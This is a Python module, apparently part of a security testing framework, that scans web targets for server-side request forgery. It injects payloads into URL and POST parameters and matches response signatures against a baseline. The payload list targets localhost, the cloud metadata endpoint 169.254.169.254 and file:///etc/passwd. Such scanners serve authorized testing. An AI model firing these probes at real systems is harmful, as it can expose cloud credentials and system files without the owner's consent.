"""Falcon MAG Framework - SSRF Scanner (baseline-aware)"""

from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.logger import get_logger

log = get_logger("ssrf")

SSRF_PAYLOADS = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://169.254.169.254/latest/meta-data/",
    "file:///etc/passwd",
    "http://[::1]/",
]

SIGNATURES = ["root:x:0:0", "ami-id", "instance-id"]


def _inject(url, param, value):
    p = urlparse(url)
    qs = parse_qs(p.query, keep_blank_values=True)
    qs[param] = [value]
    return urlunparse(p._replace(query=urlencode(qs, doseq=True)))


def _baseline_contains(target, param, value):
    """If baseline (target with this value) already reflects it, it's a false positive."""
    p = urlparse(target)
    qs = parse_qs(p.query, keep_blank_values=True)
    return value in (qs.get(param, [""])[0] or "")




def _extract_post_params(config):
    """Extract POST body params (form or JSON)."""
    params = []

    post_data = config.get("_post_data", "") or ""
    if post_data:
        try:
            parsed = parse_qs(post_data, keep_blank_values=True)
            for k, v in parsed.items():
                params.append((k, v[0] if v else "", False))
        except Exception:
            pass

    post_json = config.get("_post_json", "") or ""
    if post_json:
        try:
            import json as _json
            data = _json.loads(post_json)
            if isinstance(data, dict):
                for k, v in data.items():
                    params.append((k, str(v), True))
        except Exception:
            pass

    return params


def run(client, config):
    target = config.get("target", "")
    if not target:
        return {"error": "No target"}
    log.info("SSRF check on " + target)
    result = {"target": target, "url": target, "tested": 0, "vulnerable": []}
    parsed = urlparse(target)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if not qs:
        log.info("  No URL parameters to test")

    # Baseline response (no payload)
    baseline_resp = client.scan_request(target)
    if not baseline_resp or baseline_resp.status == 0:
        return result

    if qs:
        for param in qs:
            for payload in SSRF_PAYLOADS:
                result["tested"] += 1
                test_url = _inject(target, param, payload)
                resp = client.scan_request(test_url)
                if not resp or resp.status == 0:
                    continue

                # Skip if payload itself contains the signature (echo reflection)
                if payload in resp.text:
                    # If httpbin echoes our payload, the signature might appear
                    # We only flag if signature appears OUTSIDE the echoed payload
                    text_without_payload = resp.text.replace(payload, "")
                    for sig in SIGNATURES:
                        if sig in text_without_payload and sig not in baseline_resp.text:
                            log.warning("  SSRF in " + param + " (sig: " + sig + ")")
                            result["vulnerable"].append({
                                "url": target,
                                "original_url": target,
                                "injected_url": test_url,
                                "test_url": test_url,
                                "param": param,
                                "payload": payload,
                                "evidence": sig + " found outside payload echo",
                                "severity": "high",
                            })
                            break
                else:
                    # Payload not reflected - check for signature in body
                    for sig in SIGNATURES:
                        if sig in resp.text and sig not in baseline_resp.text:
                            log.warning("  SSRF in " + param + " (sig: " + sig + ")")
                            result["vulnerable"].append({
                                "url": target,
                                "original_url": target,
                                "injected_url": test_url,
                                "test_url": test_url,
                                "param": param,
                                "payload": payload,
                                "evidence": sig,
                                "severity": "high",
                            })
                            break

    # ==========================================================
    # POST body scanning
    # ==========================================================
    post_params = _extract_post_params(config)
    if post_params:
        log.info("  " + str(len(post_params)) + " POST parameter(s) to test")
        post_json_raw = config.get("_post_json", "") or ""
        post_data_raw = config.get("_post_data", "") or ""

        for param_name, orig_value, is_json in post_params:
            for payload in SSRF_PAYLOADS:
                result["tested"] += 1
                try:
                    if is_json:
                        import json as _json
                        body = _json.loads(post_json_raw)
                        body[param_name] = payload
                        resp = client.request("POST", target, json=body)
                    else:
                        parsed_data = parse_qs(post_data_raw, keep_blank_values=True)
                        parsed_data[param_name] = [payload]
                        new_body = urlencode(parsed_data, doseq=True)
                        resp = client.request("POST", target, data=new_body)
                except Exception as e:
                    log.debug("POST inject failed: " + str(e))
                    continue

                if not resp or resp.status == 0:
                    continue

                # Signature detection (baseline-aware)
                if payload in resp.text:
                    text_wo = resp.text.replace(payload, "")
                    for sig in SIGNATURES:
                        if sig in text_wo and sig not in baseline_resp.text:
                            log.warning("  SSRF (POST) in " + param_name + " (sig: " + sig + ")")
                            result["vulnerable"].append({
                                "url": target,
                                "original_url": target,
                                "injected_url": target,
                                "test_url": target,
                                "param": param_name,
                                "payload": payload,
                                "evidence": sig + " found outside payload echo",
                                "method": "POST",
                                "severity": "high",
                            })
                            break
                else:
                    for sig in SIGNATURES:
                        if sig in resp.text and sig not in baseline_resp.text:
                            log.warning("  SSRF (POST) in " + param_name + " (sig: " + sig + ")")
                            result["vulnerable"].append({
                                "url": target,
                                "original_url": target,
                                "injected_url": target,
                                "test_url": target,
                                "param": param_name,
                                "payload": payload,
                                "evidence": sig,
                                "method": "POST",
                                "severity": "high",
                            })
                            break

    if not result["vulnerable"]:
        log.info("  No SSRF found (" + str(result["tested"]) + " tested)")
    return result